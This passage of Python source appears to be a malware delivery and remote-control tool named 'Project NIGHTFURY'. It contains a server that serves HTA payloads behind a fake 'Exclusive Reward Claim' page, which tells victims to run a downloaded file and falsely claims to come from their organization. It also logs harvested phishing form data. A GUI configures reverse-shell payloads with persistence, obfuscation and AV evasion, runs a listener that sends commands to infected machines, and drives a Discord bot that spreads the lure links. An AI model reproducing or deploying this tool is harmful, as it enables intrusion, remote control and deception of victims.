            self.wfile.write(hta_content.encode())
            logger.info(f"Served payload to {self.client_address[0]}")
            return
        
        # Serve a decoy page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Generate a random claim token
        claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        claim_url = f"http://{self.server.domain}/claim?token={claim_token}"
        
        # Create QR code
        qr = qrcode.QRCode()
        qr.add_data(claim_url)
        qr_img = qr.make_image(fill_color="black", back_color="white")
        img_byte_arr = io.BytesIO()
        qr_img.save(img_byte_arr, format='PNG')
        img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()
        
        # Serve decoy page with QR code
        html_content = f"""
        <html>
        <head>
            <title>Exclusive Reward Claim</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c); 
                        color: white; text-align: center; padding: 20px; }}
                .container {{ max-width: 800px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); 
                            padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }}
                h1 {{ color: #ffcc00; }}
                .qr-container {{ margin: 20px auto; padding: 15px; background: white; 
                                border-radius: 10px; display: inline-block; }}
                .button {{ background: #ffcc00; color: #1a2a6c; padding: 15px 30px; 
                         font-size: 18px; border: none; border-radius: 50px; 
                         cursor: pointer; font-weight: bold; margin: 20px; 
                         box-shadow: 0 4px 8px rgba(0,0,0,0.3); }}
                .button:hover {{ background: #ffdd33; }}
                .instructions {{ background: rgba(255, 255, 255, 0.1); padding: 15px; 
                              border-radius: 10px; margin: 20px 0; text-align: left; }}
            </style>
            <script>
                function startClaim() {{
                    // Create iframe to trigger download without leaving page
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '/claim?token={claim_token}';
                    document.body.appendChild(iframe);
                    
                    // Show processing message
                    document.getElementById('processing').style.display = 'block';
                    document.getElementById('claim-button').style.display = 'none';
                    
                    // Show manual download link after delay
                    setTimeout(function() {{
                        document.getElementById('manual-download').style.display = 'block';
                    }}, 5000);
                }}
                
                function downloadLNK() {{
                    window.location.href = '/download_lnk?token={claim_token}';
                }}
            </script>
        </head>
        <body>
            <div class="container">
                <h1>🎁 Exclusive Reward Claim Center 🎁</h1>
                <p>Congratulations! You've been selected to receive a special bonus.</p>
                
                <div class="qr-container">
                    <img src="data:image/png;base64,{img_base64}" alt="Claim QR Code" width="200">
                </div>
                
                <p>Scan the QR code with your mobile device or click the button below to claim your reward:</p>
                
                <button id="claim-button" class="button" onclick="startClaim()">CLAIM YOUR REWARD NOW</button>
                
                <button id="lnk-button" class="button" onclick="downloadLNK()" style="background: #4CAF50;">
                    DOWNLOAD AS SHORTCUT
                </button>
                
                <div id="processing" style="display: none;">
                    <h2>Processing Your Claim...</h2>
                    <p>Your reward is being prepared. This may take a few moments.</p>
                    <div style="margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; 
                                border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 2s linear infinite;"></div>
                    <style>@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style>
                </div>
                
                <div id="manual-download" style="display: none; margin-top: 30px;">
                    <div class="instructions">
                        <h3>Manual Claim Instructions</h3>
                        <p>If your reward didn't start automatically:</p>
                        <ol>
                            <li>Click the download link below</li>
                            <li>Open the downloaded file</li>
                            <li>Click "Run" if prompted by Windows security</li>
                        </ol>
                        <p><a href="/claim?token={claim_token}" style="color: #ffcc00; font-weight: bold;">Download Reward Claim Assistant</a></p>
                    </div>
                </div>
                
                <div style="margin-top: 30px; font-size: 14px; opacity: 0.8;">
                    <p>This is a secure system provided by your organization.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.wfile.write(html_content.encode())
        logger.info(f"Served decoy page to {self.client_address[0]}")
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/submit_form":
            # Process form submission (phishing)
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            form_data = parse_qs(post_data)
            
            # Log form submission
            logger.info(f"Form submission from {self.client_address[0]}: {form_data}")
            
            # Redirect to claim page
            self.send_response(302)
            self.send_header('Location', '/claim')
            self.end_headers()
            return

# =====================
# ENHANCED GUI APPLICATION
# =====================

class ModernButton(QPushButton):
    """Modern styled button with hover effects"""
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setCursor(Qt.PointingHandCursor)
        self.setMinimumHeight(35)
        
    def enterEvent(self, event):
        self.setStyleSheet("""
            QPushButton {
                background-color: #5a9cff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
        """)
        super().enterEvent(event)
        
    def leaveEvent(self, event):
        self.setStyleSheet("""
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
        """)
        super().leaveEvent(event)

class AnimatedProgressBar(QProgressBar):
    """Progress bar with animation"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.animation = QPropertyAnimation(self, b"value")
        self.animation.setDuration(1000)
        
    def setValueAnimated(self, value):
        self.animation.setStartValue(self.value())
        self.animation.setEndValue(value)
        self.animation.start()

class ConnectionGraph(QWidget):
    """Real-time connection graph widget"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.data = []
        self.max_points = 50
        self.setMinimumHeight(150)
        
    def add_data_point(self, value):
        self.data.append(value)
        if len(self.data) > self.max_points:
            self.data.pop(0)
        self.update()
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Draw background
        painter.fillRect(self.rect(), QColor(40, 44, 52))
        
        if not self.data:
            return
            
        # Draw grid
        painter.setPen(QPen(QColor(70, 74, 82), 1, Qt.DotLine))
        for i in range(5):
            y = self.height() - (i * self.height() / 4)
            painter.drawLine(0, y, self.width(), y)
            
        # Draw data line
        max_value = max(self.data) if max(self.data) > 0 else 1
        path = QPainterPath()
        
        for i, value in enumerate(self.data):
            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
            y = self.height() - (value / max_value * self.height())
            
            if i == 0:
                path.moveTo(x, y)
            else:
                path.lineTo(x, y)
                
        # Draw gradient under the line
        gradient_path = QPainterPath(path)
        gradient_path.lineTo(self.width(), self.height())
        gradient_path.lineTo(0, self.height())
        gradient_path.closeSubpath()
        
        gradient = QLinearGradient(0, 0, 0, self.height())
        gradient.setColorAt(0, QColor(61, 142, 255, 100))
        gradient.setColorAt(1, QColor(61, 142, 255, 20))
        
        painter.fillPath(gradient_path, gradient)
        
        # Draw the line
        painter.setPen(QPen(QColor(61, 142, 255), 2))
        painter.drawPath(path)
        
        # Draw points
        painter.setPen(Qt.NoPen)
        painter.setBrush(QColor(61, 142, 255))
        
        for i, value in enumerate(self.data):
            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
            y = self.height() - (value / max_value * self.height())
            painter.drawEllipse(QPoint(x, y), 3, 3)

class NightfuryGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Project NIGHTFURY v5.0 - OWASP Enhanced")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize configuration
        self.config = {
            'lhost': self.get_public_ip(),
            'lport': 4444,
            'obfuscation_level': 5,
            'persistence': True,
            'evasion_techniques': True,
            'platform': "windows",
            'payload_type': "reverse_shell",
            'discord_token': "",
            'auto_server_port': 8080,
            'domain': "reward-center.org",
            'auto_start_server': False,
            'auto_start_bot': False
        }
        self.current_payload = None
        self.listener_thread = None
        self.http_server = None
        self.discord_bot = None
        self.active_connections = []
        self.connection_stats = []
        self.plugin_manager = PluginManager()
        
        # Create main tabs
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.West)
        self.tabs.setDocumentMode(True)
        self.setCentralWidget(self.tabs)
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_config_tab()
        self.create_payload_tab()
        self.create_listener_tab()
        self.create_auto_execute_tab()
        self.create_plugins_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ System Ready")
        
        # Create toolbar
        self.create_toolbar()
        
        # Apply dark theme
        self.apply_dark_theme()
        
        # Show banner
        self.show_banner()
        
        # Setup connection monitor
        self.connection_monitor = QTimer()
        self.connection_monitor.timeout.connect(self.update_connection_status)
        self.connection_monitor.start(1000)  # Check every second
        
        # Setup stats monitor
        self.stats_monitor = QTimer()
        self.stats_monitor.timeout.connect(self.update_stats)
        self.stats_monitor.start(5000)  # Update stats every 5 seconds
        
        # Load plugins
        self.load_plugins()
        
        # Setup system tray
        self.setup_system_tray()
    
    def create_toolbar(self):
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(24, 24))
        self.addToolBar(toolbar)
        
        # Add actions
        start_action = QAction(QIcon.fromTheme("media-playback-start"), "Start Listener", self)
        start_action.triggered.connect(self.start_listener)
        toolbar.addAction(start_action)
        
        stop_action = QAction(QIcon.fromTheme("media-playback-stop"), "Stop Listener", self)
        stop_action.triggered.connect(self.stop_listener)
        toolbar.addAction(stop_action)
        
        toolbar.addSeparator()
        
        generate_action = QAction(QIcon.fromTheme("document-new"), "Generate Payload", self)
        generate_action.triggered.connect(self.generate_payload)
        toolbar.addAction(generate_action)
        
        save_action = QAction(QIcon.fromTheme("document-save"), "Save Payload", self)
        save_action.triggered.connect(self.save_payload)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
        settings_action.triggered.connect(self.show_settings)
        toolbar.addAction(settings_action)
    
    def create_dashboard_tab(self):
        dashboard_tab = QWidget()
        layout = QVBoxLayout()
        dashboard_tab.setLayout(layout)
        self.tabs.addTab(dashboard_tab, "🏠 Dashboard")
        
        # Stats overview
        stats_group = QGroupBox("Overview")
        stats_layout = QHBoxLayout()
        
        # Connection stats
        conn_widget = QWidget()
        conn_layout = QVBoxLayout()
        self.conn_count = QLabel("0")
        self.conn_count.setAlignment(Qt.AlignCenter)
        self.conn_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #61aeee;")
        conn_layout.addWidget(self.conn_count)
        conn_layout.addWidget(QLabel("Active Connections"))
        conn_widget.setLayout(conn_layout)
        stats_layout.addWidget(conn_widget)
        
        # Server stats
        server_widget = QWidget()
        server_layout = QVBoxLayout()
        self.server_status = QLabel("Stopped")
        self.server_status.setAlignment(Qt.AlignCenter)
        self.server_status.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
        server_layout.addWidget(self.server_status)
        server_layout.addWidget(QLabel("Auto-Server Status"))
        server_widget.setLayout(server_layout)
        stats_layout.addWidget(server_widget)
        
        # Bot stats
        bot_widget = QWidget()
        bot_layout = QVBoxLayout()
        self.bot_status_dash = QLabel("Stopped")
        self.bot_status_dash.setAlignment(Qt.AlignCenter)
        self.bot_status_dash.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
        bot_layout.addWidget(self.bot_status_dash)
        bot_layout.addWidget(QLabel("Discord Bot Status"))
        bot_widget.setLayout(bot_layout)
        stats_layout.addWidget(bot_widget)
        
        # Payload stats
        payload_widget = QWidget()
        payload_layout = QVBoxLayout()
        self.payload_count = QLabel("0")
        self.payload_count.setAlignment(Qt.AlignCenter)
        self.payload_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #98c379;")
        payload_layout.addWidget(self.payload_count)
        payload_layout.addWidget(QLabel("Payloads Generated"))
        payload_widget.setLayout(payload_layout)
        stats_layout.addWidget(payload_widget)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Connection graph
        graph_group = QGroupBox("Connection Activity")
        graph_layout = QVBoxLayout()
        self.connection_graph = ConnectionGraph()
        graph_layout.addWidget(self.connection_graph)
        graph_group.setLayout(graph_layout)
        layout.addWidget(graph_group)
        
        # Recent activity
        activity_group = QGroupBox("Recent Activity")
        activity_layout = QVBoxLayout()
        self.activity_list = QListWidget()
        activity_layout.addWidget(self.activity_list)
        activity_group.setLayout(activity_layout)
        layout.addWidget(activity_group)
    
    def create_config_tab(self):
        config_tab = QWidget()
        layout = QVBoxLayout()
        config_tab.setLayout(layout)
        self.tabs.addTab(config_tab, "⚙️ Configuration")
        
        # Network settings group
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.lhost_input = QLineEdit(self.config['lhost'])
        self.lhost_input.setPlaceholderText("Listener IP")
        network_layout.addRow("LHOST (Listener IP):", self.lhost_input)
        
        self.lport_input = QLineEdit(str(self.config['lport']))
        self.lport_input.setPlaceholderText("Listener Port")
        network_layout.addRow("LPORT (Listener Port):", self.lport_input)
        
        self.server_port_input = QLineEdit(str(self.config['auto_server_port']))
        self.server_port_input.setPlaceholderText("Auto-Execute Server Port")
        network_layout.addRow("Server Port:", self.server_port_input)
        
        self.domain_input = QLineEdit(self.config['domain'])
        self.domain_input.setPlaceholderText("Obfuscation Domain")
        network_layout.addRow("Obfuscation Domain:", self.domain_input)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Payload settings group
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QFormLayout()
        
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows", "Linux", "macOS"])
        self.platform_combo.setCurrentText(self.config['platform'].capitalize())
        payload_layout.addRow("Target Platform:", self.platform_combo)
        
        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems(["Reverse Shell", "Meterpreter", "Bind Shell", "Web Shell"])
        payload_layout.addRow("Payload Type:", self.payload_type_combo)
        
        self.obf_level = QComboBox()
        self.obf_level.addItems(["1 (Low)", "2", "3", "4 (Recommended)", "5 (Maximum)"])
        self.obf_level.setCurrentIndex(3)
        payload_layout.addRow("Obfuscation Level:", self.obf_level)
        
        self.persistence_cb = QCheckBox("Enable persistence (survives reboot)")
        self.persistence_cb.setChecked(True)
        payload_layout.addRow(self.persistence_cb)
        
        self.evasion_cb = QCheckBox("Enable advanced evasion techniques")
        self.evasion_cb.setChecked(True)
        payload_layout.addRow(self.evasion_cb)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # API settings group
        api_group = QGroupBox("Discord Integration")
        api_layout = QFormLayout()
        
        self.discord_token_input = QLineEdit()
        self.discord_token_input.setPlaceholderText("Discord Bot Token")
        self.discord_token_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
        api_layout.addRow("Discord Token:", self.discord_token_input)
        
        api_group.setLayout(api_layout)
        layout.addWidget(api_group)
        
        # Auto-start settings
        auto_group = QGroupBox("Auto-Start Settings")
        auto_layout = QVBoxLayout()
        
        self.auto_server_cb = QCheckBox("Start auto-execution server on application launch")
        auto_layout.addWidget(self.auto_server_cb)
        
        self.auto_bot_cb = QCheckBox("Start Discord bot on application launch")
        auto_layout.addWidget(self.auto_bot_cb)
        
        auto_group.setLayout(auto_layout)
        layout.addWidget(auto_group)
        
        # Save button
        save_btn = ModernButton("Save Configuration")
        save_btn.clicked.connect(self.save_config)
        save_btn.setFixedHeight(40)
        layout.addWidget(save_btn)
    
    def create_payload_tab(self):
        payload_tab = QWidget()
        layout = QVBoxLayout()
        payload_tab.setLayout(layout)
        self.tabs.addTab(payload_tab, "🔧 Payload")
        
        # Payload generation options
        options_group = QGroupBox("Generation Options")
        options_layout = QHBoxLayout()
        
        self.gen_ps_btn = ModernButton("Generate PowerShell")
        self.gen_ps_btn.clicked.connect(lambda: self.generate_payload("windows"))
        options_layout.addWidget(self.gen_ps_btn)
        
        self.gen_hta_btn = ModernButton("Generate HTA")
        self.gen_hta_btn.clicked.connect(self.generate_hta)
        options_layout.addWidget(self.gen_hta_btn)
        
        self.gen_lnk_btn = ModernButton("Generate LNK")
        self.gen_lnk_btn.clicked.connect(self.generate_lnk)
        options_layout.addWidget(self.gen_lnk_btn)
        
        self.gen_bash_btn = ModernButton("Generate Bash")
        self.gen_bash_btn.clicked.connect(lambda: self.generate_payload("linux"))
        options_layout.addWidget(self.gen_bash_btn)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Payload preview
        payload_preview_group = QGroupBox("Payload Preview")
        payload_preview_layout = QVBoxLayout()
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setPlaceholderText("Payload will appear here after generation")
        payload_preview_layout.addWidget(self.payload_preview)
        
        # Save buttons
        save_btn_layout = QHBoxLayout()
        self.save_btn = ModernButton("Save to File")
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        save_btn_layout.addWidget(self.save_btn)
        
        self.copy_btn = ModernButton("Copy to Clipboard")
        self.copy_btn.setEnabled(False)
        self.copy_btn.clicked.connect(self.copy_payload)
        save_btn_layout.addWidget(self.copy_btn)
        
        self.test_btn = ModernButton("Test in Sandbox")
        self.test_btn.setEnabled(False)
        self.test_btn.clicked.connect(self.test_payload)
        save_btn_layout.addWidget(self.test_btn)
        
        payload_preview_layout.addLayout(save_btn_layout)
        payload_preview_group.setLayout(payload_preview_layout)
        layout.addWidget(payload_preview_group)
    
    def create_listener_tab(self):
        listener_tab = QWidget()
        layout = QVBoxLayout()
        listener_tab.setLayout(layout)
        self.tabs.addTab(listener_tab, "👂 Listener")
        
        # Listener controls
        controls_group = QGroupBox("Listener Controls")
        controls_layout = QHBoxLayout()
        
        self.start_btn = ModernButton("Start Listener")
        self.start_btn.clicked.connect(self.start_listener)
        controls_layout.addWidget(self.start_btn)
        
        self.stop_btn = ModernButton("Stop Listener")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_listener)
        controls_layout.addWidget(self.stop_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Connection status
        status_group = QGroupBox("Connection Status")
        status_layout = QVBoxLayout()
        
        self.connection_status = QLabel("Listener not running")
        self.connection_status.setAlignment(Qt.AlignCenter)
        self.connection_status.setStyleSheet("font-weight: bold; font-size: 14px;")
        status_layout.addWidget(self.connection_status)
        
        # Splitter for connections and command execution
        splitter = QSplitter(Qt.Horizontal)
        
        # Connections list
        conn_widget = QWidget()
        conn_layout = QVBoxLayout()
        conn_layout.addWidget(QLabel("Active Connections:"))
        self.connections_list = QListWidget()
        conn_layout.addWidget(self.connections_list)
        conn_widget.setLayout(conn_layout)
        splitter.addWidget(conn_widget)
        
        # Command execution
        command_widget = QWidget()
        command_layout = QVBoxLayout()
        command_layout.addWidget(QLabel("Command Execution:"))
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute on connected clients")
        self.command_input.setEnabled(False)
        command_layout.addWidget(self.command_input)
        
        self.send_btn = ModernButton("Send Command")
        self.send_btn.setEnabled(False)
        self.send_btn.clicked.connect(self.send_command)
        command_layout.addWidget(self.send_btn)
        
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        self.command_output.setPlaceholderText("Command output will appear here")
        command_layout.addWidget(self.command_output)
        
        command_widget.setLayout(command_layout)
        splitter.addWidget(command_widget)
        
        # Set splitter sizes
        splitter.setSizes([300, 500])
        status_layout.addWidget(splitter)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
    
    def create_auto_execute_tab(self):
        auto_tab = QWidget()
        layout = QVBoxLayout()
        auto_tab.setLayout(layout)
        self.tabs.addTab(auto_tab, "🚀 Auto-Execution")
        
        # Auto-Execute Server Section
        server_group = QGroupBox("Auto-Execute Server")
        server_layout = QVBoxLayout()
        
        server_info = QLabel("This server delivers payloads that auto-execute when users click the reward claim link")
        server_info.setWordWrap(True)
        server_layout.addWidget(server_info)
        
        # Server controls
        server_controls = QHBoxLayout()
        
        self.start_server_btn = ModernButton("Start Auto-Server")
        self.start_server_btn.clicked.connect(self.start_auto_server)
        server_controls.addWidget(self.start_server_btn)
        
        self.stop_server_btn = ModernButton("Stop Auto-Server")
        self.stop_server_btn.setEnabled(False)
        self.stop_server_btn.clicked.connect(self.stop_auto_server)
        server_controls.addWidget(self.stop_server_btn)
        
        server_layout.addLayout(server_controls)
        
        # Server URL display
        self.server_url = QLineEdit()
        self.server_url.setReadOnly(True)
        self.server_url.setPlaceholderText("Server URL will appear here after starting")
        server_layout.addWidget(self.server_url)
        
        # Copy URL button
        copy_url_btn = ModernButton("Copy Claim URL")
        copy_url_btn.clicked.connect(self.copy_claim_url)
        server_layout.addWidget(copy_url_btn)
        
        # QR code display
        self.qr_label = QLabel()
        self.qr_label.setAlignment(Qt.AlignCenter)
        self.qr_label.setMinimumSize(200, 200)
        server_layout.addWidget(self.qr_label)
        
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        # Discord Bot Section
        discord_group = QGroupBox("Discord Command Integration")
        discord_layout = QVBoxLayout()
        
        discord_info = QLabel("The bot will respond to '!claim bonus' commands with an auto-execute link")
        discord_info.setWordWrap(True)
        discord_layout.addWidget(discord_info)
        
        # Bot controls
        bot_controls = QHBoxLayout()
        
        self.start_bot_btn = ModernButton("Start Discord Bot")
        self.start_bot_btn.clicked.connect(self.start_discord_bot)
        bot_controls.addWidget(self.start_bot_btn)
        
        self.stop_bot_btn = ModernButton("Stop Discord Bot")
        self.stop_bot_btn.setEnabled(False)
        self.stop_bot_btn.clicked.connect(self.stop_discord_bot)
        bot_controls.addWidget(self.stop_bot_btn)
        
        discord_layout.addLayout(bot_controls)
        
        # Bot status
        self.bot_status = QLabel("Bot status: Not running")
        discord_layout.addWidget(self.bot_status)
        
        discord_group.setLayout(discord_layout)
        layout.addWidget(discord_group)
        
        # Phishing Campaign Section
        phishing_group = QGroupBox("Phishing Campaign")
        phishing_layout = QVBoxLayout()
        
        phishing_info = QLabel("Create and manage phishing campaigns with tracking")
        phishing_info.setWordWrap(True)
        phishing_layout.addWidget(phishing_info)
        
        # Campaign controls
        campaign_controls = QHBoxLayout()
        
        self.create_campaign_btn = ModernButton("Create Campaign")
        self.create_campaign_btn.clicked.connect(self.create_campaign)
        campaign_controls.addWidget(self.create_campaign_btn)
        
        self.view_stats_btn = ModernButton("View Statistics")
        self.view_stats_btn.clicked.connect(self.view_campaign_stats)
        campaign_controls.addWidget(self.view_stats_btn)
        
        phishing_layout.addLayout(campaign_controls)
        
        phishing_group.setLayout(phishing_layout)
        layout.addWidget(phishing_group)
    
    def create_plugins_tab(self):
        plugins_tab = QWidget()
        layout = QVBoxLayout()
        plugins_tab.setLayout(layout)
        self.tabs.addTab(plugins_tab, "🔌 Plugins")
        
        # Plugin browser
        browser_group = QGroupBox("Available Plugins")
        browser_layout = QVBoxLayout()
        
        self.plugin_list = QListWidget()
        browser_layout.addWidget(self.plugin_list)
        
        browser_group.setLayout(browser_layout)
        layout.addWidget(browser_group)
        
        # Plugin controls
        controls_group = QGroupBox("Plugin Controls")
        controls_layout = QHBoxLayout()
        
        self.load_plugin_btn = ModernButton("Load Plugin")
        self.load_plugin_btn.clicked.connect(self.load_plugin)
        controls_layout.addWidget(self.load_plugin_btn)
        
        self.unload_plugin_btn = ModernButton("Unload Plugin")
        self.unload_plugin_btn.clicked.connect(self.unload_plugin)
        controls_layout.addWidget(self.unload_plugin_btn)
        
        self.configure_plugin_btn = ModernButton("Configure Plugin")
        self.configure_plugin_btn.clicked.connect(self.configure_plugin)
        controls_layout.addWidget(self.configure_plugin_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Plugin info
        info_group = QGroupBox("Plugin Information")
        info_layout = QVBoxLayout()
        
        self.plugin_info = QTextEdit()
        self.plugin_info.setReadOnly(True)
        self.plugin_info.setPlaceholderText("Plugin information will appear here")
        info_layout.addWidget(self.plugin_info)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
    
    def apply_dark_theme(self):
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.WindowText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Base, QColor(30, 32, 38))
        dark_palette.setColor(QPalette.AlternateBase, QColor(40, 44, 52))
        dark_palette.setColor(QPalette.ToolTipBase, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ToolTipText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Text, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.Button, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Highlight, QColor(61, 142, 255))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        
        # Set style
        self.setStyleSheet("""
            QGroupBox {
                border: 1px solid #4a4a4a;
                border-radius: 8px;
                margin-top: 1ex;
                font-weight: bold;
                color: #61aeee;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #61aeee;
            }
            QTextEdit, QListWidget, QLineEdit {
                background-color: #282c34;
                color: #abb2bf;
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                padding: 8px;
                font-family: 'Consolas';
            }
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                min-height: 30px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #5a9cff;
            }
            QPushButton:disabled {
                background-color: #555;
            }
            QTabWidget::pane {
                border: 1px solid #4a4a4a;
                background: #282c34;
            }
            QTabBar::tab {
                background: #282c34;
                color: #abb2bf;
                padding: 10px;
                border: 1px solid #4a4a4a;
                border-bottom: none;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background: #3d8eff;
                color: white;
                border-color: #4a4a4a;
            }
            QProgressBar {
                border: 1px solid #4a4a4a;
                border-radius: 5px;
                text-align: center;
                background: #282c34;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #3d8eff;
                width: 10px;
            }
            QStatusBar {
                background: #21252b;
                color: #abb2bf;
                padding: 4px;
            }
            QToolBar {
                background: #21252b;
                border: none;
                spacing: 5px;
            }
            QToolButton {
                background: #3d8eff;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 5px;
            }
            QToolButton:hover {
                background: #5a9cff;
            }
            QSplitter::handle {
                background: #4a4a4a;
            }
        """)
    
    def show_banner(self):
        banner = """
  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
  ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
  ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
  
  Version 5.0 - OWASP Enhanced Edition
  Advanced Payload Framework with Multi-Platform Support
        """
        print(banner)
    
    def setup_system_tray(self):
        if not QSystemTrayIcon.isSystemTrayAvailable():
            return
            
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        
        show_action = QAction("Show", self)
        show_action.triggered.connect(self.show)
        tray_menu.addAction(show_action)
        
        hide_action = QAction("Hide", self)
        hide_action.triggered.connect(self.hide)
        tray_menu.addAction(hide_action)
        
        tray_menu.addSeparator()
        
        quit_action = QAction("Quit", self)
        quit_action.triggered.connect(QApplication.quit)
        tray_menu.addAction(quit_action)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
    
    def load_plugins(self):
        # Load built-in plugins
        # This is a placeholder - in a real implementation, you would scan a plugins directory
        self.plugin_manager.register_plugin("AV Evasion", AVEvasionPlugin)
        self.plugin_manager.register_plugin("Persistence", PersistencePlugin)
        self.plugin_manager.register_plugin("Lateral Movement", LateralMovementPlugin)
        
        # Populate plugin list
        for plugin_name in self.plugin_manager.list_plugins():
            self.plugin_list.addItem(plugin_name)
    
    def load_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to load")
            return
            
        plugin_name = selected_items[0].text()
        plugin = self.plugin_manager.load_plugin(plugin_name, self)
        
        if plugin:
            self.plugin_info.setText(f"Loaded plugin: {plugin.name}\nVersion: {plugin.version}\n\n{plugin.description}")
            self.activity_list.addItem(f"[+] Loaded plugin: {plugin.name}")
        else:
            QMessageBox.warning(self, "Error", f"Failed to load plugin: {plugin_name}")
    
    def unload_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to unload")
            return
            
        plugin_name = selected_items[0].text()
        if plugin_name in self.plugin_manager.loaded_plugins:
            del self.plugin_manager.loaded_plugins[plugin_name]
            self.plugin_info.clear()
            self.activity_list.addItem(f"[-] Unloaded plugin: {plugin_name}")
        else:
            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
    
    def configure_plugin(self):
        selected_items = self.plugin_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a plugin to configure")
            return
            
        plugin_name = selected_items[0].text()
        plugin = self.plugin_manager.get_plugin(plugin_name)
        
        if plugin:
            # Show plugin configuration dialog
            dialog = QDialog(self)
